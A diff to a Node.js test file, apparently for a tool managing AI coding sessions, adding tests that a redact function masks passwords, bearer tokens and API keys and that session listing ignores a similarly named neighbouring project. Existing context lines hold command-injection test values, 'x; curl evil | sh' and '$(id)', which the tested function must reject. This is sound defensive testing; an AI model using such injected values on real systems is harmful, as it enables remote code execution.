@@ -7,7 +7,8 @@ import { join } from 'node:path'
 import { test } from 'node:test'
 
 import { cookieSentTo, refreshedSession } from '../scripts/browser.mjs'
-import { okRef, okRel } from '../scripts/platform.mjs'
+import { redact } from '../scripts/metrics.mjs'
+import { okRef, okRel, projectDirName, projectDirs } from '../scripts/platform.mjs'
 import { listed, okSlug } from '../scripts/resources.mjs'
 import { fill } from '../scripts/serve.mjs'
 import { classify, configSources, strictKey } from '../scripts/sources.mjs'
@@ -135,4 +136,38 @@ test('a server command placeholder never brings shell syntax with it', () => {
   assert.equal(fill('cd {wt}', vars), 'cd /w s/.worktrees/RVD-1/be', 'a space in a path is not shell syntax')
   assert.throws(() => fill('dev --db {db}', { ...vars, db: 'x; curl evil | sh' }), /shell characters/)
   assert.throws(() => fill('dev --db {db}', { ...vars, db: '$(id)' }), /shell characters/)
+})
+
+test('metrics never copy a secret out of a transcript', () => {
+  assert.equal(redact('psql postgres://app:s3cr3tpw@localhost:5432/db -c "select 1"'), 'psql postgres://app:***@localhost:5432/db -c "select 1"')
+  assert.equal(redact('curl -H "Authorization: Bearer abcdef1234567890XYZ" https://x'), 'curl -H "Authorization: Bearer ***" https://x')
+  assert.equal(redact('API_KEY=abcd1234efgh pnpm test'), 'API_KEY=*** pnpm test')
+  assert.equal(redact('mysql --password=hunter2222 -e x'), 'mysql --password=*** -e x')
+  for (const plain of ['pnpm test -- --run src/token.test.ts', 'gh pr view 12 --json state', 'git -C /w/be status --porcelain']) assert.equal(redact(plain), plain)
+})
+
+test('a workspace lists its own sessions and those of its sub-folders, never a neighbour with a longer name', () => {
+  const home = tmp()
+  const keep = { HOME: process.env.HOME, USERPROFILE: process.env.USERPROFILE, CLAUDE_CONFIG_DIR: process.env.CLAUDE_CONFIG_DIR }
+  Object.assign(process.env, { HOME: home, USERPROFILE: home, CLAUDE_CONFIG_DIR: join(home, '.claude') })
+  try {
+    const ws = join(home, 'work', 'app')
+    const mk = (cwd, line = (c) => JSON.stringify({ type: 'user', cwd: c })) => {
+      const d = join(home, '.claude', 'projects', projectDirName(cwd))
+      mkdirSync(d, { recursive: true })
+      writeFileSync(join(d, 's1.jsonl'), `${JSON.stringify({ type: 'queue-operation' })}\n${line(cwd)}\n`)
+      return d
+    }
+    const own = mk(ws)
+    const sub = mk(join(ws, 'backend'))
+    const neighbour = mk(join(home, 'work', 'app-private')) // same name prefix, another project
+    const silent = mk(join(ws, 'docs'), () => JSON.stringify({ type: 'user' })) // says nothing about where it ran
+    const got = projectDirs(ws)
+    assert.ok(got.includes(own) && got.includes(sub))
+    assert.ok(!got.includes(neighbour), 'another project is not this workspace')
+    assert.ok(!got.includes(silent), 'unknown is left out')
+    assert.deepEqual(projectDirs(ws), got, 'the remembered answer is the same')
+  } finally {
+    for (const [k, v] of Object.entries(keep)) { if (v === undefined) delete process.env[k]; else process.env[k] = v }
+  }
 })
